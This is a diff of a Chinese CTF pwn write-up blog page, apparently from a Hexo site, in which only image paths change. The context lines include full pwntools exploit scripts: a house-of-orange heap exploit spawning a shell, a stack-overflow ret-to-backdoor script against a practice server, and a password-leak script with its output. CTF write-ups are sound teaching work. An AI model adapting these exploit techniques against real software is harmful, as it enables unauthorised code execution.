@@ -496,10 +496,10 @@
 <h2 id="纵横杯2020-wind-farm-panel"><a href="#纵横杯2020-wind-farm-panel" class="headerlink" title="纵横杯2020 - wind_farm_panel"></a>纵横杯2020 - wind_farm_panel</h2><blockquote>
 <p>house of orange的经典题，没啥变化，，，有了上一个基础，很快能做出来</p>
 </blockquote>
-<h3 id="程序流程-1"><a href="#程序流程-1" class="headerlink" title="程序流程"></a>程序流程</h3><p><img src="/2021/05/13/house-of-orange/image-20201229182916014.png" alt="image-20201229182916014"></p>
+<h3 id="程序流程-1"><a href="#程序流程-1" class="headerlink" title="程序流程"></a>程序流程</h3><p><img src="/2021/05/13/13-41-undefined/image-20201229182916014.png" alt="image-20201229182916014"></p>
 <p>根据菜单，只有添加、打印和修改功能，没有free功能</p>
-<p><img src="/2021/05/13/house-of-orange/image-20201229183505395.png" alt="image-20201229183505395"></p>
-<p><img src="/2021/05/13/house-of-orange/image-20201229183037804.png" alt="image-20201229183037804"></p>
+<p><img src="/2021/05/13/13-41-undefined/image-20201229183505395.png" alt="image-20201229183505395"></p>
+<p><img src="/2021/05/13/13-41-undefined/image-20201229183037804.png" alt="image-20201229183037804"></p>
 <p>而且添加和修改的时候都有堆溢出，故应该用house of orange来解。</p>
 <h3 id="完整exp-1"><a href="#完整exp-1" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding = utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">file = <span class="string">"wind_farm_panel"</span></span><br><span class="line"></span><br><span class="line">local=<span class="number">1</span></span><br><span class="line"><span class="comment">#local libc</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">  p = process(<span class="string">"./"</span>+file)</span><br><span class="line">  elf = ELF(<span class="string">"./"</span>+file)</span><br><span class="line">  libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc-2.23.so"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug libc</span></span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">1</span>:</span><br><span class="line">  p = process([<span class="string">"/usr/local/glibc-2.23/lib/ld-2.23.so"</span>, <span class="string">"./"</span>+file],</span><br><span class="line">            env=&#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"/usr/local/glibc-2.23/lib/libc-2.23.so"</span>&#125;)</span><br><span class="line">  elf = ELF(<span class="string">"./"</span>+file)</span><br><span class="line">  libc = ELF(<span class="string">"/usr/local/glibc-2.23/lib/libc-2.23.so"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#remote</span></span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">2</span>:</span><br><span class="line">  p = process([<span class="string">"/home/winter/hoo/ld-2.23.so"</span>, <span class="string">"./"</span>+file],</span><br><span class="line">            env=&#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"/home/winter/hoo/libc-2.23.so"</span>&#125;)</span><br><span class="line">  elf = ELF(<span class="string">"./"</span>+file)</span><br><span class="line">  libc = ELF(<span class="string">"./libc-2.23.so"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(choice)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">    p.sendline(str(choice))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx,size,content)</span>:</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"turned on(0 ~ 5):"</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">"wind turbine: "</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">"Your name:"</span>)</span><br><span class="line">    p.send(str(content))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">" viewed: "</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"turbine:"</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">"Please input: "</span>)</span><br><span class="line">    p.send(str(content))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x90</span>,<span class="string">'winter'</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x90</span></span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0xf61</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x1000</span>,<span class="string">'winter'</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x400</span>,<span class="string">'a'</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:]+<span class="string">'\x00\x00'</span>)<span class="number">-0x39C161</span></span><br><span class="line">log.success(hex(libc_base))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x11</span></span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">'a'</span>*<span class="number">0x10</span>)</span><br><span class="line">heapbase = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)<span class="number">-0x61</span></span><br><span class="line">log.success(<span class="string">"heap_base:"</span>+hex(heapbase))</span><br><span class="line"></span><br><span class="line">_IO_list_all = libc_base + libc.sym[<span class="string">'_IO_list_all'</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x400</span></span><br><span class="line">fake_file = <span class="string">'/bin/sh\x00'</span> + p64(<span class="number">0x60</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>) + p64(_IO_list_all<span class="number">-0x10</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>) + p64(<span class="number">1</span>)</span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0xd8</span>,<span class="string">'\x00'</span>)</span><br><span class="line">payload += fake_file</span><br><span class="line">payload += p64(heapbase + <span class="number">0x588</span>)</span><br><span class="line"><span class="comment">#0x555555f774b0 + 0xd8 - heap_base</span></span><br><span class="line">payload += p64(system) * <span class="number">8</span></span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line"></span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">"turned on(0 ~ 5):"</span>)</span><br><span class="line">p.sendline(str(<span class="number">3</span>))</span><br><span class="line">p.recvuntil(<span class="string">"wind turbine: "</span>)</span><br><span class="line">p.sendline(str(<span class="number">0x90</span>))</span><br><span class="line">    </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
@@ -626,11 +626,11 @@
 <h3 id="程序流程"><a href="#程序流程" class="headerlink" title="程序流程"></a>程序流程</h3><blockquote>
 <p>mmap开辟空间，输入shellcode，然后绕过检查即可执行shellcode</p>
 </blockquote>
-<p><img src="/2021/05/08/buu%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98%EF%BC%884%EF%BC%89/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210506205132913.png" alt="image-20210506205132913"></p>
+<p><img src="/2021/05/08/00-04-undefined/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210506205132913.png" alt="image-20210506205132913"></p>
 <blockquote>
 <p>要绕过检查，令第一个字符为空即可。</p>
 </blockquote>
-<p><img src="/2021/05/08/buu%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98%EF%BC%884%EF%BC%89/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210506205233682.png" alt="image-20210506205233682"></p>
+<p><img src="/2021/05/08/00-04-undefined/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210506205233682.png" alt="image-20210506205233682"></p>
 <h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>为了让shellcode正常执行，需要构造一条合法以\x00开头的语句。</p>
 <p><code>\x00b\x00</code>、<code>\x00b\x22</code>都是合法语句。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#\x00b\x00</span><br><span class="line">pwndbg&gt; x&#x2F;30gx 0x7f77a00c1000</span><br><span class="line">0x7f77a00c1000:	0x2fb848686a006200&lt;&#x3D;	0x50732f2f2f6e6962</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x&#x2F;30i 0x7f77a00c1000</span><br><span class="line">   0x7f77a00c1000:	add    BYTE PTR [rdx+0x0],ah</span><br><span class="line">   0x7f77a00c1003:	push   0x68</span><br><span class="line">#三个字节组成一个语句</span><br><span class="line"></span><br><span class="line">#同理</span><br><span class="line">pwndbg&gt; x&#x2F;30gx 0x7fb05ae4b000</span><br><span class="line">0x7fb05ae4b000:	0x2fb848686a226200	0x50732f2f2f6e6962</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x&#x2F;30i 0x7fb05ae4b000</span><br><span class="line">   0x7fb05ae4b000:	add    BYTE PTR [rdx+0x22],ah</span><br><span class="line">   0x7fb05ae4b003:	push   0x68</span><br></pre></td></tr></table></figure>
@@ -663,11 +663,11 @@
 </blockquote>
 </li>
 </ol>
-<p><img src="/2021/05/08/buu%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98%EF%BC%884%EF%BC%89/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210507220553456.png" alt="image-20210507220553456"></p>
+<p><img src="/2021/05/08/00-04-undefined/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210507220553456.png" alt="image-20210507220553456"></p>
 <blockquote>
 <p>前面输入的字符串，存在格式化字符串，有5个字节可以利用，可以用来泄露libc地址</p>
 </blockquote>
-<p><img src="/2021/05/08/buu%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98%EF%BC%884%EF%BC%89/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210507220712091.png" alt="image-20210507220712091"></p>
+<p><img src="/2021/05/08/00-04-undefined/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210507220712091.png" alt="image-20210507220712091"></p>
 <ol start="2">
 <li>正常堆体<ol>
 <li>add功能：创建0~0x70大小的块</li>
@@ -757,7 +757,7 @@
           <h2 id="bjdctf-2020-babystack2"><a href="#bjdctf-2020-babystack2" class="headerlink" title="bjdctf_2020_babystack2"></a>bjdctf_2020_babystack2</h2><blockquote>
 <p>简单的，首先通过整数溢出绕过检查，然后栈溢出，存在后门函数，直接执行即可</p>
 </blockquote>
-<p><img src="/2021/05/08/buu%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98%EF%BC%882%EF%BC%89/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210506201527291.png" alt="image-20210506201527291"></p>
+<p><img src="/2021/05/08/00-04-undefined/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210506201527291.png" alt="image-20210506201527291"></p>
 <h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">"./bjdctf_2020_babystack2"</span>)</span><br><span class="line">p=remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">28526</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x000400726</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"name:"</span>)</span><br><span class="line">p.sendline(str(<span class="number">-1</span>))</span><br><span class="line">p.recvuntil(<span class="string">"name?"</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x10</span>+<span class="number">0x8</span>)+p64(backdoor)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
 
@@ -833,18 +833,18 @@
 <h3 id="题目流程"><a href="#题目流程" class="headerlink" title="题目流程"></a>题目流程</h3><blockquote>
 <p>两个函数，read和write</p>
 </blockquote>
-<p><img src="/2021/05/06/ciscn-2019-es-7/image-20210506185234819.png" alt="image-20210506185234819"></p>
+<p><img src="/2021/05/06/19-23-undefined/image-20210506185234819.png" alt="image-20210506185234819"></p>
 <blockquote>
 <p>输入和打印的是同一个地址，rsp+buf，buf的长度为0x10。</p>
 <p>所以栈溢出的偏移为0x10，再下一个地址是rsp，ret的时候，pop eip会取过来。</p>
 </blockquote>
-<p><img src="/2021/05/06/ciscn-2019-es-7/image-20210506185325681.png" alt="image-20210506185325681"></p>
+<p><img src="/2021/05/06/19-23-undefined/image-20210506185325681.png" alt="image-20210506185325681"></p>
 <blockquote>
 <p>程序给了两个后门函数</p>
 <p>第一个是rax，设置0xf，可以进行srop</p>
 <p>第二个设置为execve的调用号，设置参数为“/bin/sh”、0、0（必须设置，因为vuln函数中rdi，rsi和rdx都有值）即可get shell</p>
 </blockquote>
-<p><img src="/2021/05/06/ciscn-2019-es-7/image-20210506185517298.png" alt="image-20210506185517298"></p>
+<p><img src="/2021/05/06/19-23-undefined/image-20210506185517298.png" alt="image-20210506185517298"></p>
 <h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>综上，有两种方法可以进行漏洞利用</p>
 <ol>
 <li>利用gadget2，需要设置三个寄存器参数，可以通过ret2csu来设置</li>
@@ -977,14 +977,14 @@
 <p>虽然很简单，<del>但好像第一次碰见这样的题</del>，所以记录下。</p>
 </blockquote>
 <h3 id="反汇编问题"><a href="#反汇编问题" class="headerlink" title="反汇编问题"></a>反汇编问题</h3><p>问题：main函数f5的时候报如下错误</p>
-<p><img src="/2021/05/01/picoctf-2018-leak-me%E8%AF%A6%E8%A7%A3/image-20210501234336628.png" alt="image-20210501234336628"></p>
+<p><img src="/2021/05/01/23-54-undefined/image-20210501234336628.png" alt="image-20210501234336628"></p>
 <p>解决：</p>
 <ol>
 <li><p>找到报错的地址：0x8048705【按g输入地址即可】</p>
-<p><img src="/2021/05/01/picoctf-2018-leak-me%E8%AF%A6%E8%A7%A3/image-20210501234523311.png" alt="image-20210501234523311"></p>
+<p><img src="/2021/05/01/23-54-undefined/image-20210501234523311.png" alt="image-20210501234523311"></p>
 </li>
 <li><p>双击函数，然后f5</p>
-<p><img src="/2021/05/01/picoctf-2018-leak-me%E8%AF%A6%E8%A7%A3/image-20210501234614572.png" alt="image-20210501234614572"></p>
+<p><img src="/2021/05/01/23-54-undefined/image-20210501234614572.png" alt="image-20210501234614572"></p>
 </li>
 <li><p>然后就可以正常了</p>
 </li>
@@ -996,11 +996,11 @@
 <li>比较输入password和password</li>
 <li>相同打印flag</li>
 </ol>
-<p><img src="/2021/05/01/picoctf-2018-leak-me%E8%AF%A6%E8%A7%A3/image-20210501234815805.png" alt="image-20210501234815805"></p>
+<p><img src="/2021/05/01/23-54-undefined/image-20210501234815805.png" alt="image-20210501234815805"></p>
 <h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>由于name和password是紧挨着的，而且差距0x100。</p>
 <p>如果name的长度为0x100，那么puts输出name的时候，就会把password一起带出来了。</p>
 <p>而且name的最大长度可以达到0x100，故首先令name=0x100，即可泄露password，接着就可以得到flag了。</p>
-<p><img src="/2021/05/01/picoctf-2018-leak-me%E8%AF%A6%E8%A7%A3/image-20210501234915134.png" alt="image-20210501234915134"></p>
+<p><img src="/2021/05/01/23-54-undefined/image-20210501234915134.png" alt="image-20210501234915134"></p>
 <h4 id="获得password"><a href="#获得password" class="headerlink" title="获得password"></a>获得password</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p &#x3D; remote(&quot;node3.buuoj.cn&quot;,26105)</span><br><span class="line">p.recvuntil(&quot;name?&quot;)</span><br><span class="line">p.sendline(&quot;a&quot;*0x100)</span><br><span class="line"># password &#x3D; &quot;a_reAllY_s3cuRe_p4s$word_f85406&quot;</span><br><span class="line"># p.sendline(password)</span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[*] Switching to interactive mode</span><br><span class="line">Hello aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa,a_reAllY_s3cuRe_p4s$word_f85406</span><br><span class="line"></span><br><span class="line">Incorrect Password!</span><br></pre></td></tr></table></figure>
@@ -1085,14 +1085,14 @@
 <p>还是高校战役的题，并且以前做过，，，，<del>但当时tcl，复现也不会，虽然现在也很菜</del></p>
 <p>这里再重新写篇文章，记录下。</p>
 </blockquote>
-<h3 id="程序流程"><a href="#程序流程" class="headerlink" title="程序流程"></a>程序流程</h3><p><img src="/2021/05/01/%C2%96gyctf-2020-some-thing-exceting%E8%AF%A6%E8%A7%A3/image-20210501212850010.png" alt="image-20210501212850010"></p>
+<h3 id="程序流程"><a href="#程序流程" class="headerlink" title="程序流程"></a>程序流程</h3><p><img src="/2021/05/01/21-48-undefined/image-20210501212850010.png" alt="image-20210501212850010"></p>
 <h4 id="init"><a href="#init" class="headerlink" title="init"></a>init</h4><p>程序最开始进入了init函数</p>
 <blockquote>
 <p>init函数首先将flag读入了内存。</p>
 <p>接着又将内存flag的数据读入了s，在0x6020a8中。</p>
 <p>由于0x6020a0处设置了0x60，可以将fake chunk申请到这里，再读取块数据，即可得到flag</p>
 </blockquote>
-<p><img src="/2021/05/01/%C2%96gyctf-2020-some-thing-exceting%E8%AF%A6%E8%A7%A3/image-20210501213125204.png" alt="image-20210501213125204"></p>
+<p><img src="/2021/05/01/21-48-undefined/image-20210501213125204.png" alt="image-20210501213125204"></p>
 <h4 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h4><ol>
 <li>create：创建一个指针chunk，里面存放了ba和na两个块的地址；创建ba和na，大小为0~0x70，fastbin大小内。</li>
 <li>delete：free块，但是没有清零，可以double free，获得一定的地址读写能力</li>
@@ -1353,12 +1353,12 @@
 <p>没想到居然是去年高校战役的题，好吧，当时还做了下这个比赛，不过没弄这道题，发现还是一个比较常规的题，house of force</p>
 </blockquote>
 <h3 id="程序流程"><a href="#程序流程" class="headerlink" title="程序流程"></a>程序流程</h3><p>堆体，，，只有一个功能（puts函数没有用）</p>
-<p><img src="/2021/04/27/%C2%96gyctf-2020-force/image-20210427211531288.png" alt="image-20210427211531288"></p>
+<p><img src="/2021/04/27/23-47-undefined/image-20210427211531288.png" alt="image-20210427211531288"></p>
 <p>对于add</p>
 <blockquote>
 <p>分配任意大小的chunk，但是固定读入数据0x50大小，所以如果申请的大小小于0x50，就存在堆溢出</p>
 </blockquote>
-<p><img src="/2021/04/27/%C2%96gyctf-2020-force/image-20210427211635840.png" alt="image-20210427211635840"></p>
+<p><img src="/2021/04/27/23-47-undefined/image-20210427211635840.png" alt="image-20210427211635840"></p>
 <h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>由于题目是保护全开，所以不能覆盖got表</p>
 <p>方法：</p>
 <ol>
@@ -1525,7 +1525,7 @@
 <p>参考：<a href="[wdb_2018_2nd_easyfmt](https://www.cnblogs.com/luoleqi/p/13498183.html)">wdb_2018_2nd_easyfmt</a></p>
 </blockquote>
 <h3 id="程序流程"><a href="#程序流程" class="headerlink" title="程序流程"></a>程序流程</h3><p>程序流程非常简单，可以一直进行格式化字符串漏洞。</p>
-<p><img src="/2021/04/25/wdb-2018-2nd-easyfmt%E8%AF%A6%E8%A7%A3/image-20210425225434398.png" alt="image-20210425225434398"></p>
+<p><img src="/2021/04/25/23-34-undefined/image-20210425225434398.png" alt="image-20210425225434398"></p>
 <h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><ol>
 <li>首先通过格式化字符串泄露栈信息</li>
 <li>通过格式化字符串修改printf_got表为system（one_gadget本地打通了，远程没有，，）</li>
@@ -1535,7 +1535,7 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">winter@ubuntu:~&#x2F;buu$ file wdb_2018_2nd_easyfmt </span><br><span class="line">wdb_2018_2nd_easyfmt: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter &#x2F;lib&#x2F;ld-linux.so.2, for GNU&#x2F;Linux 2.6.32, BuildID[sha1]&#x3D;f86851c3576d0aabf0b0b2310d835d0f6e660eb8, not stripped</span><br><span class="line">winter@ubuntu:~&#x2F;buu$ checksec wdb_2018_2nd_easyfmt </span><br><span class="line">[*] &#39;&#x2F;home&#x2F;winter&#x2F;buu&#x2F;wdb_2018_2nd_easyfmt&#39;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
 
 <p>格式化字符串，偏移为6</p>
-<p><img src="/2021/04/25/wdb-2018-2nd-easyfmt%E8%AF%A6%E8%A7%A3/image-20210425233348293.png" alt="image-20210425233348293"></p>
+<p><img src="/2021/04/25/23-34-undefined/image-20210425233348293.png" alt="image-20210425233348293"></p>
 <h4 id="1-泄露信息"><a href="#1-泄露信息" class="headerlink" title="1.泄露信息"></a>1.泄露信息</h4><h5 id="方法一：栈上数据"><a href="#方法一：栈上数据" class="headerlink" title="方法一：栈上数据"></a>方法一：栈上数据</h5><blockquote>
 <p>可以直接查看栈上的信息进行泄露</p>
 </blockquote>
